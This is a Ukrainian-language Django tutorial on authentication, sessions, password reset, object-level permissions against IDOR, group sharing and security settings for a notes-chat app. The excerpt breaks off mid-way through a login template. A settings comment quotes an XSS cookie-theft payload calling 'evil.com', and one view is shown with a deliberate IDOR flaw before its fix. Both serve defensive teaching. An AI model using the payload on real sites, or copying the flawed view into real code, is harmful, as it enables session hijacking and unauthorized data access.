# Туторіал 05 — Django Автентифікація та Безпека

> Цей туторіал проводить тебе через **повний стек безпеки Django-застосунку**:
> login/logout → password reset → захист об'єктів → групи для спільного доступу.
>
> Проєкт — **`notes_chat_app`** — менеджер нотаток із груповим чатом у реальному часі.
> У цьому розділі ми розбираємо шари безпеки що вже реалізовані у застосунку.
> Ти побачиш як безпека "вплітається" в реальний код, а не існує окремо.

---

## Зміст

**Архітектурний фундамент** _(читати перед кодом)_
- [01 · AUTH BASICS — Автентифікація vs Авторизація](#01--auth-basics)
- [02 · SESSIONS — Як Django пам'ятає юзера](#02--sessions)
- [03 · PASSWORD SECURITY — Скидання і зміна пароля](#03--password-security)
- [04 · OBJECT-LEVEL PERMISSIONS — Захист від IDOR](#04--object-level-permissions)
- [05 · GROUP SHARING — Спільний доступ через Django Groups](#05--group-sharing)
- [06 · SECURITY SETTINGS — Що і навіщо](#06--security-settings)

**Покрокова реалізація**
1. [Крок 0 — Запуск проєкту (Docker)](#крок-0--запуск)
2. [Крок 1 — Settings: auth + security](#крок-1--settings)
3. [Крок 2 — URLs: підключення вбудованих auth views](#крок-2--urls)
4. [Крок 3 — Login / Register templates](#крок-3--login--register)
5. [Крок 4 — Password Reset Flow (5 шаблонів)](#крок-4--password-reset)
6. [Крок 5 — Password Change](#крок-5--password-change)
7. [Крок 6 — Object-Level Permissions у views.py](#крок-6--object-level-permissions)
8. [Крок 7 — Models: Group FK](#крок-7--models-group-fk)
9. [Крок 8 — Selectors: Q-filter для групового доступу](#крок-8--selectors)
10. [Крок 9 — Services: Group CRUD](#крок-9--services)
11. [Крок 10 — Group Views + URLs](#крок-10--group-views)
12. [Крок 11 — Group Templates](#крок-11--group-templates)
13. [Структура файлів проєкту](#структура-файлів)

---

## 01 · AUTH BASICS

> **Головне питання:** Хто ти і що тобі можна?
>
> Ці два питання — основа будь-якої системи безпеки.
> Django відповідає на них через дві різні системи.

### Аналогія — паспорт і квиток на концерт

- **Паспорт** = **Автентифікація (AuthN)**: "Хто ти?" — підтверджує особу.
  Охоронець перевіряє документ і переконується що він справжній.
- **Квиток** = **Авторизація (AuthZ)**: "Куди тобі можна?" — визначає права.
  Касир перевіряє квиток і вирішує де ти можеш сидіти (VIP чи партер).

У аеропорту: охорона перевіряє паспорт (AuthN), потім посадковий талон (AuthZ).
Паспорт без квитка — не пустять. Квиток без паспорта — теж.

### Таблиця: AuthN vs AuthZ

| | Автентифікація (AuthN) | Авторизація (AuthZ) |
|--|------------------------|---------------------|
| **Питання** | Хто ти? | Що тобі можна? |
| **Відповідь** | Перевірка пароля | Перевірка прав на об'єкт |
| **Django інструмент** | `authenticate()`, `login()` | `@login_required`, `get_object_or_404` |
| **Де перевіряється** | `AuthenticationMiddleware` | У кожному view окремо |
| **Що якщо не пройшов** | Форма з помилкою | 302 Redirect або 404/403 |

### Компоненти Django Auth

```python
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required

# 1. Перевірити credentials (AuthN):
user = authenticate(request, username='alice', password='secret')
# → Django: шукає User з username='alice'
# → Перевіряє PBKDF2 хеш пароля в БД
# → Повертає User object якщо збігається, або None

# 2. Запустити сесію після успішного входу:
if user is not None:
    login(request, user)   # ← створює session_id у БД + cookie у браузері
    # Тепер request.user = alice у всіх наступних запитах

# 3. Завершити сесію:
logout(request)   # ← видаляє запис сесії з БД + примусово стирає cookie
```

### Middleware chain: хто встановлює `request.user`

```
Кожен запит проходить через ВЕСЬ ланцюг middleware (settings.py → MIDDLEWARE):

1. DebugExceptionMiddleware  — логування/показ помилок у dev
2. DebugToolbarMiddleware    — Django Debug Toolbar
3. SecurityMiddleware        — HTTPS редирект, HTTP заголовки безпеки
4. SessionMiddleware         — читає Cookie: sessionid=... → завантажує сесію з БД
5. CommonMiddleware          — trailing slash, Content-Type
6. CsrfViewMiddleware        — перевіряє csrfmiddlewaretoken у POST запитах
7. AuthenticationMiddleware  — читає session → встановлює request.user
   │                           Якщо session є → request.user = User(id=42)
   │                           Якщо немає    → request.user = AnonymousUser
8. MessageMiddleware         — Django messages flash framework
9. XFrameOptionsMiddleware   — X-Frame-Options: DENY заголовок
   │
   ▼
View функція (request.user вже встановлено!)
```

**Порядок middleware важливий:**
- `SessionMiddleware` має бути перед `AuthenticationMiddleware` — Auth читає session
- `CsrfViewMiddleware` перед View — перевіряє CSRF до виклику будь-якого view
- `SessionMiddleware` перед `CsrfViewMiddleware` — CSRF використовує session

### `@login_required` — що робить і де живе

```python
# notes_app/views.py
from django.contrib.auth.decorators import login_required

@login_required   # ← декоратор, перевіряє request.user.is_authenticated
def note_list(request):
    # Якщо request.user = AnonymousUser:
    #   → redirect до LOGIN_URL (settings.py) + ?next=/notes/
    #   → 302 /accounts/login/?next=/notes/
    # Якщо request.user = User(id=42):
    #   → виконує view нормально
    notes = selectors.get_user_notes(request.user)
    return render(request, 'notes_app/note_list.html', {'notes': notes})
```

```python
# settings.py — куди перенаправляти незалогінених:
LOGIN_URL = '/accounts/login/'
LOGIN_REDIRECT_URL = '/notes/'           # куди ПІСЛЯ успішного входу
LOGOUT_REDIRECT_URL = '/accounts/login/' # куди ПІСЛЯ виходу
```

> **Важливо:** `@login_required` — це тільки AuthN ("ти залогінений?").
> Він НЕ перевіряє чи ця конкретна нотатка належить тобі.
> Для цього потрібен окремий AuthZ крок у view (дивись Крок 6).

---

## 02 · SESSIONS

> **Проблема:** HTTP — протокол без стану (stateless). Кожен запит ніби "перший".
> Сервер не знає хто ти, якщо ти не надіслав докази.

### Аналогія — клубна карта в кафе

Уяви кафе де за кожну каву нараховують бали. Без картки — офіціант забуває тебе
після кожного відвідування. З карткою — бали накопичуються.

**Session cookie = клубна картка**: браузер зберігає і автоматично пред'являє при кожному запиті.

### Покроковий flow: Login → Cookie → Наступний запит

```
КРОК 1: Аліса натискає "Увійти"
─────────────────────────────────────────────────────────────────────────
Браузер:  POST /accounts/login/  {username: 'alice', password: 'secret'}
Django:   CsrfViewMiddleware → перевіряє csrfmiddlewaretoken ✓
          authenticate('alice', 'secret') → User(id=42) ✓
          login(request, user)
            → INSERT INTO django_session
              (session_key='xK9mPq', session_data={_auth_user_id: 42}, expire_date=...)
          Відповідь: 302 /notes/
          Header:    Set-Cookie: sessionid=xK9mPq; HttpOnly; SameSite=Lax; Path=/

КРОК 2: Браузер зберігає cookie. Аліса бачить /notes/
─────────────────────────────────────────────────────────────────────────
Браузер зберігає: sessionid=xK9mPq (у захищеному сховищі браузера)

КРОК 3: Наступний запит Аліси (GET /notes/)
─────────────────────────────────────────────────────────────────────────
Браузер:  GET /notes/
Header:   Cookie: sessionid=xK9mPq   ← надсилається автоматично!
          Django SessionMiddleware:
            SELECT * FROM django_session WHERE session_key='xK9mPq'
            → session_data = {_auth_user_id: 42}
          Django AuthenticationMiddleware:
            SELECT * FROM auth_user WHERE id=42
            → request.user = User(id=42, username='alice')
View:     @login_required → request.user.is_authenticated → True ✓
          notes = selectors.get_user_notes(request.user)
          → SQL: SELECT * FROM note WHERE user_id=42 OR group_id IN (...)

КРОК 4: Вихід (Logout)
─────────────────────────────────────────────────────────────────────────
Браузер:  POST /accounts/logout/  (з CSRF токеном у POST body)
Django:   logout(request)
            → DELETE FROM django_session WHERE session_key='xK9mPq'
          Відповідь: 302 /accounts/login/
          Header:    Set-Cookie: sessionid=; expires=Thu, 01 Jan 1970 00:00:00 GMT
Браузер:  Видаляє cookie. request.user → AnonymousUser.
```

### Cookie у DevTools: як побачити сесію

```
Chrome DevTools → Application → Storage → Cookies → http://localhost

Поле          Значення
─────────────────────────────────────────────────
Name          sessionid
Value         xK9mPq...  (32-символьний random key)
Domain        localhost
Path          /
Expires       (через 2 тижні за замовчуванням)
Size          ~100 B
HttpOnly      ✓  (JS не може прочитати!)
SameSite      Lax

Спробуй у Console:
  document.cookie  →  'csrftoken=abc123'
  (sessionid відсутній — HttpOnly!)
```

### Cookie налаштування в settings.py

```python
# settings.py:

SESSION_COOKIE_HTTPONLY = True
# ↑ JS не може прочитати sessionid через document.cookie
#   Захист від XSS-атак що намагаються вкрасти cookie:
#   <script>fetch('evil.com?c='+document.cookie)</script>
#   → з HttpOnly: sessionid у document.cookie відсутній → атака безрезультатна

SESSION_COOKIE_SAMESITE = "Lax"
# ↑ "Lax": cookie надсилається тільки з того самого сайту АБО
#   при навігаційних GET запитах (посилання)
#   Захист від CSRF: evil.com не може надіслати POST з твоїм cookie
#   "Strict" — строгіше: cookie не надсилається навіть при переходах з зовнішніх посилань
#   "None" — небезпечно без Secure (HTTPS) прапора

CSRF_COOKIE_HTTPONLY = False
# ↑ False: JS може читати csrftoken (потрібно для fetch/axios запитів з CSRF header)
#   Якщо не використовуєш JS для форм → True для строгого захисту

# Production HTTPS (розкоментуй коли є SSL-сертифікат):
# SESSION_COOKIE_SECURE = True   # cookie тільки по HTTPS (не HTTP)
# CSRF_COOKIE_SECURE = True
```

---

## 03 · PASSWORD SECURITY

> Django надає **повну систему управління паролями "з коробки"** через `django.contrib.auth`.
> Не треба писати жодного view для login, logout, password reset або change.

### Що `include('django.contrib.auth.urls')` підключає

```python
# notes_project/urls.py:
path("accounts/", include("django.contrib.auth.urls")),
```

Це автоматично реєструє:

| URL | View | Назва (для `{% url %}`) | Шаблон (треба створити) |
|-----|------|------------------------|------------------------|
| `/accounts/login/` | `LoginView` | `login` | `registration/login.html` |
| `/accounts/logout/` | `LogoutView` | `logout` | (redirect, без шаблону) |
| `/accounts/password_change/` | `PasswordChangeView` | `password_change` | `registration/password_change_form.html` |
| `/accounts/password_change/done/` | `PasswordChangeDoneView` | `password_change_done` | `registration/password_change_done.html` |
| `/accounts/password_reset/` | `PasswordResetView` | `password_reset` | `registration/password_reset_form.html` |
| `/accounts/password_reset/done/` | `PasswordResetDoneView` | `password_reset_done` | `registration/password_reset_done.html` |
| `/accounts/reset/<uidb64>/<token>/` | `PasswordResetConfirmView` | `password_reset_confirm` | `registration/password_reset_confirm.html` |
| `/accounts/reset/done/` | `PasswordResetCompleteView` | `password_reset_complete` | `registration/password_reset_complete.html` |

**Висновок:** 8 URL + 7 views вже написані Django — ти пишеш тільки HTML шаблони.

### Password Reset Flow — 5 кроків

```
Крок 1: /accounts/password_reset/
─────────────────────────────────────────────────────────────────────────
Аліса забула пароль → вводить email у форму
→ password_reset_form.html

Крок 2: Django обробляє POST
─────────────────────────────────────────────────────────────────────────
Django шукає User з таким email (нічого не повідомляє якщо не знайдено —
безпечна поведінка: не розкриваємо чи є такий email)
Генерує унікальний токен: sha256(user_pk + timestamp + SECRET_KEY)
Надсилає email з посиланням:
  /accounts/reset/<uidb64>/<token>/

[DEV: EMAIL_BACKEND = console → email виводиться в docker logs]
[PROD: EMAIL_BACKEND = smtp → реальний email]

Крок 3: /accounts/password_reset/done/
─────────────────────────────────────────────────────────────────────────
Django показує: "Перевірте пошту" (незалежно від того чи знайдено email)
→ password_reset_done.html

Крок 4: /accounts/reset/<uidb64>/<token>/
─────────────────────────────────────────────────────────────────────────
Аліса переходить за посиланням з email
Django: uidb64 → user_pk, token → перевіряє підпис
Чи дійсний? (72 год, одноразовий — після використання інвалідується)
Якщо OK → форма для нового пароля + password validators
→ password_reset_confirm.html

Крок 5: Успіх → /accounts/reset/done/
─────────────────────────────────────────────────────────────────────────
Пароль збережено (хешований PBKDF2 з salt) → всі сесії цього юзера скинуто
→ password_reset_complete.html
```

### Як PBKDF2 зберігає паролі

```python
# Що зберігається у БД (auth_user.password):
'pbkdf2_sha256$600000$salt$hash'
#  ↑алгоритм   ↑ітерації  ↑сіль ↑хеш

# Ніколи не зберігається plain text!
# Навіть Django не знає оригінальний пароль — тільки перевіряє хеш.

# Перевірка:
# authenticate(request, username='alice', password='mysecret')
# → pbkdf2_sha256(600000 iterations, 'mysecret' + stored_salt)
# → порівнює з stored_hash
# → повертає User або None

# Чому 600000 ітерацій?
# Якщо хакер вкрав БД → brute force:
#   SHA-256 без stretching: 10 мільярдів спроб/сек
#   PBKDF2 з 600000 ітер:  ~10 000 спроб/сек (у 1 000 000 разів повільніше!)
```

### Password Validators

```python
# settings.py — 4 вбудовані валідатори:
AUTH_PASSWORD_VALIDATORS = [
    # Пароль схожий на username / email / first_name?
    {"NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator"},
    # Мінімум 8 символів (можна налаштувати: "OPTIONS": {"min_length": 10})
    {"NAME": "django.contrib.auth.password_validation.MinimumLengthValidator"},
    # Є у списку 20 000 найпоширеніших паролів? ("password", "123456", "qwerty"...)
    {"NAME": "django.contrib.auth.password_validation.CommonPasswordValidator"},
    # Складається тільки з цифр?
    {"NAME": "django.contrib.auth.password_validation.NumericPasswordValidator"},
]

# Валідатори запускаються:
# 1. При реєстрації (UserCreationForm)
# 2. При зміні пароля (PasswordChangeForm, PasswordResetConfirmView)
# 3. При set_password() → validate_password()
#    НЕ при User.objects.create_user() якщо не викликати validate_password()!
```

---

## 04 · OBJECT-LEVEL PERMISSIONS

> **Найпоширеніша вразливість у вебзастосунках (OWASP A01):**
> Broken Access Control — юзер отримує доступ до чужих даних.

### Що таке IDOR (Insecure Direct Object Reference)

```
Аліса зареєстрована. Вона бачить URL своєї нотатки: /notes/42/edit/
Вона думає: "А що буде якщо змінити 42 на 43?"
Аліса переходить на: /notes/43/edit/
Якщо view не перевіряє власника → Аліса редагує нотатку БОБА!

Це атака IDOR — Insecure Direct Object Reference.
OWASP A01 (Broken Access Control) — найчастіша причина витоків даних.
```

### Різниця між AuthN і AuthZ на прикладі

```python
# ─── ПРОБЛЕМА: @login_required — тільки AuthN, не AuthZ! ────────────────────
@login_required
def note_edit(request, pk):
    note = get_object_or_404(Note, pk=pk)   # ← IDOR вразливість!
    # Аліса залогінена → @login_required пропускає ✓
    # Але note(pk=43) належить Бобу → Аліса редагує чужі дані! ✗

# SQL генерований:
# SELECT * FROM note WHERE pk = 43
# → повертає нотатку Боба! Жодної перевірки user_id!


# ─── РІШЕННЯ: додай user= до get_object_or_404 ──────────────────────────────
@login_required
def note_edit(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)   # ← AuthZ ✓
    # pk=43 + user=Alice
    # SQL: SELECT * FROM note WHERE pk=43 AND user_id=42
    # Боб має note(pk=43, user_id=99) → user_id=42 не збігається → 404
```

**Золоте правило:**
```
@login_required               = "ти залогінений?"        (AuthN)
get_object_or_404(            = "цей об'єкт — твій?"     (AuthZ)
    Note, pk=pk,
    user=request.user
)
```

**Чому 404, а не 403?**
```
403 Forbidden → повідомляємо: "Цей ресурс існує, але ти не маєш доступу"
                Хакер знає що id=43 існує → може спробувати інші атаки

404 Not Found  → повідомляємо: "Такого ресурсу не існує"
                Хакер не знає існує чи ні → менше інформації для атаки

Принцип: не розкривати факт існування чужих об'єктів.
```

### Патерн для власних об'єктів

```python
# Застосовується до: note_edit, note_delete, note_detail (якщо особиста),
# notebook_edit, notebook_delete, todolist_edit, shopping_edit, тощо

@login_required
def note_delete(request, pk):
    note = get_object_or_404(Note, pk=pk, user=request.user)
    if request.method == 'POST':
        services.delete_note(note)
        messages.warning(request, 'Нотатку видалено.')
        return redirect('notes_app:note_list')
    return render(request, 'notes_app/note_confirm_delete.html', {'note': note})


@login_required
def notebook_edit(request, pk):
    # Те саме — Notebook з user=request.user
    notebook = get_object_or_404(Notebook, pk=pk, user=request.user)
    # ...
```

### Патерн для спільних об'єктів (власник АБО член групи)

```python
# Нотатки можуть бути груповими → перевірка складніша:
from django.db.models import Q

@login_required
def note_detail(request, pk):
    user_groups = request.user.groups.all()
    note = get_object_or_404(
        Note.objects.filter(
            Q(user=request.user) | Q(group__in=user_groups)
        ),
        pk=pk
    )
    # Аліса бачить нотатку якщо:
    #   note.user == Alice (особиста нотатка)
    #   АБО note.group in Alice.groups.all() (групова нотатка)
    #
    # SQL:
    # SELECT * FROM note
    # WHERE pk = 43
    #   AND (user_id = 42 OR group_id IN (1, 3))
    # → Якщо ні те, ні інше → 404
    return render(request, 'notes_app/note_detail.html', {'note': note})
```

### Таблиця захищених views у notes_app

| View | Захист | Як реалізовано |
|------|--------|----------------|
| `note_list` | `@login_required` | Selector `Q(user=user) \| Q(group__in=...)` |
| `note_edit` | `@login_required` + owner | Q-filter для доступу, потім `note.user != request.user` для редагування |
| `note_delete` | `@login_required` + owner | Те саме |
| `notebook_edit` | `@login_required` + owner | `get_object_or_404(Notebook, pk=pk, user=request.user)` |
| `notebook_delete` | `@login_required` + owner | Те саме |
| `group_detail` | `@login_required` + membership | `get_group_with_members(pk, user)` → None якщо не член |
| `group_delete` | `@login_required` + membership | `group.user_set.filter(pk=user.pk).exists()` |

---

## 05 · GROUP SHARING

> **Ідея:** Аліса хоче ділитись нотатками з командою.
> Вона створює групу "Команда розробки" і додає Боба.
> Нотатки та списки покупок позначені цією групою бачать обидва.

### Django вбудована модель Group

Django вже має готову модель `Group` у `django.contrib.auth`:

```python
from django.contrib.auth.models import Group

# Кожна Group має:
#   id          — PK
#   name        — назва ('Сімя', 'Команда', 'Клас')
#   user_set    — M2N зв'язок з User (через auth_user_groups junction table)
#   permissions — M2N зв'язок з Permission (для role-based access — не наш випадок)

# У notes_app ми використовуємо Group для ШЕРИНГУ ДАНИХ між юзерами,
# а не для Django Permission System (is_staff, is_superuser, permissions).
```

### ER-Діаграма: User, Group, Note, ShoppingList

```
┌──────────────┐         ┌──────────────────────┐         ┌──────────────┐
│    User      │         │  auth_user_groups     │         │    Group     │
│──────────────│         │──────────────────────│         │──────────────│
│ id (PK)      │◄───────►│ user_id  (FK → User) │◄───────►│ id (PK)      │
│ username     │   M:N   │ group_id (FK → Group)│   M:N   │ name         │
│ password     │         └──────────────────────┘         └──────┬───────┘
│ email        │                                                  │
└──────┬───────┘                                                  │ 1:N (FK SET_NULL)
       │                                                          │
       │ 1:N (FK CASCADE)                                         │
       │                                                          │
       ▼                                                          ▼
┌────────────────────────────────────────────────────────────────────────────┐
│                                   Note                                      │
│────────────────────────────────────────────────────────────────────────────│
│ id (PK)                                                                     │
│ title                                                                       │
│ content                                                                     │
│ user_id   (FK → User,  CASCADE)  ← обов'язковий: хто власник               │
│ group_id  (FK → Group, SET_NULL) ← необов'язковий: для шерингу             │
│ notebook_id (FK → Notebook, SET_NULL)                                       │
│ priority, is_pinned, is_archived ...                                        │
└────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────┐
│                                ShoppingList                                 │
│────────────────────────────────────────────────────────────────────────────│
│ user_id   (FK → User,  CASCADE)  ← власник                                 │
│ group_id  (FK → Group, SET_NULL) ← для шерингу                             │
└────────────────────────────────────────────────────────────────────────────┘

Якщо group_id = NULL  → особиста нотатка (тільки user_id бачить)
Якщо group_id = 5     → групова нотатка (всі члени групи 5 бачать)
```

### Q-filter: "мої або групові"

```python
# notes_app/selectors.py
from django.db.models import Q

def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """Повертає нотатки юзера + нотатки груп де він є членом."""
    user_groups = user.groups.all()   # всі групи юзера (1 SQL)
    qs = Note.objects.filter(
        Q(user=user) |               # власні нотатки
        Q(group__in=user_groups),    # нотатки груп де user є членом
        is_archived=archived,
    ).select_related('notebook', 'group').prefetch_related('tags')
    # ...
    return qs.order_by('-is_pinned', '-priority', '-updated_at')
```

```
Аліса є в групах: [Команда(id=1), Сімя(id=3)]

SQL (спрощено):
  SELECT * FROM note
  WHERE (user_id = 42)              -- особисті нотатки Аліси
     OR (group_id IN (1, 3))        -- нотатки її груп
  AND is_archived = FALSE
  ORDER BY is_pinned DESC, priority DESC, updated_at DESC
```

### Порівняння підходів до шерингу

| | M2M `shared_with` (TodoList) | Group FK (Note, ShoppingList) |
|--|------------------------------|-------------------------------|
| **Де** | `TodoList.shared_with = ManyToManyField(User)` | `Note.group = ForeignKey(Group)` |
| **Кому шерити** | Конкретним юзерам | Всім членам групи |
| **Управління** | Через форму з чекбоксами | Через `/groups/<pk>/` |
| **Коли підходить** | "Поділитись з конкретним Бобом" | "Поділитись з усією командою" |
| **Видалення** | `ManyToMany` запис видаляється | `SET_NULL` → нотатка стає особистою |

---

## 06 · SECURITY SETTINGS

> Django має безліч security налаштувань. Більшість "вимкнені" за замовчуванням
> щоб не ламати localhost розробку. У production їх треба увімкнути.

### Таблиця: кожна настройка і що захищає

| Настройка | Значення | Від чого захищає |
|-----------|----------|-----------------|
| `SESSION_COOKIE_HTTPONLY = True` | JS не читає sessionid | XSS → Session Hijacking |
| `SESSION_COOKIE_SAMESITE = "Lax"` | Cookie тільки з того ж сайту | CSRF через крос-сайтові форми |
| `CSRF_COOKIE_HTTPONLY = False` | JS читає csrftoken | (False = для fetch/axios) |
| `X_FRAME_OPTIONS = "DENY"` | Заборона `<iframe>` вбудовування | Clickjacking атаки |
| `SECURE_CONTENT_TYPE_NOSNIFF = True` | Не "вгадувати" MIME тип | XSS через підроблені файли |
| `DEBUG = False` | Ховає stack traces | Витік SECRET_KEY та коду |
| `ALLOWED_HOSTS = ['mysite.com']` | Тільки цей домен | HTTP Host header attacks |
| `CSRF_TRUSTED_ORIGINS = [...]` | Дозволені HTTPS origins | CSRF через ngrok/proxy |

### Що витікає при `DEBUG = True` в production

```
Помилка сервера при DEBUG=True показує:
  ✗ Повний stack trace (шляхи до файлів, назви функцій, рядки коду)
  ✗ Значення ВСІХ локальних змінних у момент помилки
  ✗ SECRET_KEY витікає! (хакер може підробляти session cookies і CSRF токени)
  ✗ Всі SQL-запити зберігаються в пам'яті → memory leak під навантаженням
  ✗ INSTALLED_APPS, DATABASES, MIDDLEWARE — вся конфіга видима у браузері

DEBUG = False + ALLOWED_HOSTS = ['mysite.com'] обов'язково в production.
```

### Production HTTPS (розкоментувати на сервері)

```python
# settings.py — закоментовано у dev (щоб localhost працював по HTTP):

# SESSION_COOKIE_SECURE = True
# ↑ Cookie надсилається ТІЛЬКИ по HTTPS
# Без цього: Man-in-the-middle може перехопити sessionid по HTTP

# CSRF_COOKIE_SECURE = True
# ↑ Те саме для CSRF cookie

# SECURE_SSL_REDIRECT = True
# ↑ Будь-який HTTP запит → 301 Moved Permanently → HTTPS

# SECURE_HSTS_SECONDS = 31536000  # 1 рік
# ↑ Браузер запам'ятовує: ТІЛЬКИ HTTPS на 1 рік
# (HTTP Strict Transport Security заголовок)
# УВАГА: після увімкнення — важко відкотити! Браузер кешує і ігнорує HTTP.
```

### ngrok і CSRF_TRUSTED_ORIGINS

У `notes_chat_app` є ngrok для публічного доступу. Django перевіряє `Origin` заголовок при POST через HTTPS:

```python
# settings.py (вже реалізовано):
_ngrok_domain = os.environ.get('NGROK_DOMAIN', '')
CSRF_TRUSTED_ORIGINS = [f'https://{_ngrok_domain}'] if _ngrok_domain else []
# = ['https://fawn-natural-mayfly.ngrok-free.app']

# .env:
# NGROK_DOMAIN=fawn-natural-mayfly.ngrok-free.app

# Без CSRF_TRUSTED_ORIGINS:
# POST /accounts/login/ через ngrok → 403 Forbidden: CSRF verification failed
# Origin: https://fawn-natural-mayfly.ngrok-free.app — не в trusted origins!
```

---

## Крок 0 — Запуск

```bash
# 1. Скопіювати конфігурацію
cp .env.example .env
# Відредагувати .env: SECRET_KEY, POSTGRES_*, за потреби NGROK_*

# 2. Підняти весь стек (PostgreSQL + Redis + Web + Nginx + ngrok + Selenium)
docker compose up --build

# 3. Переглянути логи (password reset email буде тут)
docker compose logs -f web

# 4. Відкрити у браузері
open http://localhost   # через nginx
# АБО
open http://localhost:8001   # напряму до Uvicorn

# 5. Демо-дані (3 юзери, групи, нотатки)
# Якщо SEED_DEMO_DATA=1 у .env → автоматично при старті
# Вручну:
docker compose exec web python manage.py seed_demo_data
# Логіни: demo_alice/demo1234, demo_bob/demo1234, demo_carol/demo1234
```

### Що дивитись у браузері

| URL | Що показує |
|-----|-----------|
| `http://localhost/accounts/login/` | Login форма |
| `http://localhost/register/` | Реєстрація нового акаунту |
| `http://localhost/accounts/password_reset/` | Форма відновлення пароля |
| `http://localhost/accounts/password_change/` | Зміна пароля (після входу) |
| `http://localhost/notes/` | Список нотаток (тільки залогінені) |
| `http://localhost/groups/` | Мої групи |
| `http://localhost/groups/new/` | Створити групу |
| `http://localhost/admin/` | Django Admin |

### Де знайти email у Docker логах

```bash
# Після натискання "Надіслати посилання" у password_reset формі:
docker compose logs web | grep -A 10 "Subject: Password reset"

# АБО в реальному часі:
docker compose logs -f web
# Шукай рядки:
# Content-Type: text/plain; charset="utf-8"
# Subject: Password reset on localhost
# ...
# http://localhost/accounts/reset/Mg/abc123-token/   ← цей URL копіюй!
```

---

## Крок 1 — Settings

**Місце:** `notes_project/settings.py`

```python
# ── Auth redirects ─────────────────────────────────────────────────────────────
LOGIN_URL = '/accounts/login/'           # @login_required → redirect сюди
LOGIN_REDIRECT_URL = '/notes/'           # після успішного login
LOGOUT_REDIRECT_URL = '/accounts/login/' # після logout

# ── Password Validators ────────────────────────────────────────────────────────
AUTH_PASSWORD_VALIDATORS = [
    {"NAME": "django.contrib.auth.password_validation.UserAttributeSimilarityValidator"},
    {"NAME": "django.contrib.auth.password_validation.MinimumLengthValidator"},
    {"NAME": "django.contrib.auth.password_validation.CommonPasswordValidator"},
    {"NAME": "django.contrib.auth.password_validation.NumericPasswordValidator"},
]

# ── Email (password reset) ─────────────────────────────────────────────────────
EMAIL_BACKEND = "django.core.mail.backends.console.EmailBackend"
# DEV: email у stdout/logs контейнера
# PROD: замінити на:
# EMAIL_BACKEND = "django.core.mail.backends.smtp.EmailBackend"
# EMAIL_HOST = "smtp.gmail.com"
# EMAIL_PORT = 587
# EMAIL_USE_TLS = True
# EMAIL_HOST_USER = os.environ['EMAIL_HOST_USER']
# EMAIL_HOST_PASSWORD = os.environ['EMAIL_HOST_PASSWORD']
# DEFAULT_FROM_EMAIL = "noreply@mysite.com"

# ── ngrok CSRF ────────────────────────────────────────────────────────────────
_ngrok_domain = os.environ.get('NGROK_DOMAIN', '')
CSRF_TRUSTED_ORIGINS = [f'https://{_ngrok_domain}'] if _ngrok_domain else []

# ── Web Security ──────────────────────────────────────────────────────────────
SESSION_COOKIE_HTTPONLY = True      # JS не читає sessionid (XSS захист)
CSRF_COOKIE_HTTPONLY = False        # JS читає csrftoken (для fetch у чаті)
SESSION_COOKIE_SAMESITE = "Lax"    # CSRF захист для cookies
X_FRAME_OPTIONS = "DENY"           # Clickjacking захист
SECURE_CONTENT_TYPE_NOSNIFF = True  # MIME sniffing захист

# ── Messages → Bootstrap alert variants ────────────────────────────────────────
from django.contrib.messages import constants as messages_constants
MESSAGE_TAGS = {
    messages_constants.DEBUG:   'secondary',
    messages_constants.INFO:    'info',
    messages_constants.SUCCESS: 'success',
    messages_constants.WARNING: 'warning',
    messages_constants.ERROR:   'danger',
}
```

---

## Крок 2 — URLs

**Місце:** `notes_project/urls.py`

```python
from django.contrib import admin
from django.urls import path, include
from debug_toolbar.toolbar import debug_toolbar_urls

urlpatterns = [
    path("admin/", admin.site.urls),

    # Django built-in auth: login, logout, password change, password reset
    # Реєструє 8 URL одним рядком!
    path("accounts/", include("django.contrib.auth.urls")),

    # Наш застосунок: нотатки, групи, реєстрація, WebSocket chat
    path("", include("notes_app.urls", namespace="notes_app")),
] + debug_toolbar_urls()
```

**Місце:** `notes_app/urls.py`

```python
from django.urls import path
from . import views

app_name = 'notes_app'

urlpatterns = [
    # ── Notes ──────────────────────────────────────────────────────────────
    path('notes/',              views.note_list,    name='note_list'),
    path('notes/new/',          views.note_create,  name='note_create'),
    path('notes/<int:pk>/',     views.note_detail,  name='note_detail'),
    path('notes/<int:pk>/edit/',   views.note_edit,   name='note_edit'),
    path('notes/<int:pk>/delete/', views.note_delete, name='note_delete'),

    # ── Notebooks ──────────────────────────────────────────────────────────
    path('notebooks/',               views.notebook_list,   name='notebook_list'),
    path('notebooks/new/',           views.notebook_create, name='notebook_create'),
    path('notebooks/<int:pk>/edit/', views.notebook_edit,   name='notebook_edit'),
    path('notebooks/<int:pk>/delete/', views.notebook_delete, name='notebook_delete'),

    # ── Auth (custom — registration not in auth.urls) ──────────────────────
    path('register/', views.register, name='register'),

    # ── Groups ─────────────────────────────────────────────────────────────
    path('groups/',                  views.group_list,    name='group_list'),
    path('groups/new/',              views.group_create,  name='group_create'),
    path('groups/<int:pk>/',         views.group_detail,  name='group_detail'),
    path('groups/<int:pk>/delete/',  views.group_delete,  name='group_delete'),

    # ── Chat (WebSocket, через groups) ────────────────────────────────────
    path('groups/<int:pk>/chat/',    views.group_chat,    name='group_chat'),
]
```

---

## Крок 3 — Login / Register

### templates/registration/login.html

Django автоматично шукає `registration/login.html` для `LoginView`.

```html
{% extends 'base.html' %}

{% block body %}
<div class="min-vh-100 d-flex align-items-center justify-content-center bg-light">
  <div class="card shadow" style="width: 400px;">
    <div class="card-body p-4">

      <!-- Лого / бренд -->
      <div class="text-center mb-4">
        <i class="bi bi-journal-bookmark-fill display-4 text-primary"></i>
        <h5 class="fw-bold mt-2 mb-0">Notes Chat App</h5>
        <p class="text-muted small">Увійди до свого акаунту</p>
      </div>

      <!-- Помилка входу -->
      {% if form.errors %}
      <div class="alert alert-danger py-2 small">
        <i class="bi bi-exclamation-triangle me-1"></i>
        Невірний логін або пароль. Спробуй ще раз.
      </div>
      {% endif %}

      <!-- Форма входу -->
      <form method="post">
        {% csrf_token %}
        {# ↑ ОБОВ'ЯЗКОВО! Без csrf_token Django відхилить POST з 403 Forbidden #}

        <div class="mb-3">
          <label class="form-label fw-semibold">Логін</label>
          <input type="text"
                 name="{{ form.username.html_name }}"
                 class="form-control"
                 autofocus
                 autocomplete="username"
                 placeholder="твій_логін">
        </div>
        <div class="mb-4">
          <label class="form-label fw-semibold">Пароль</label>
          <input type="password"
                 name="{{ form.password.html_name }}"
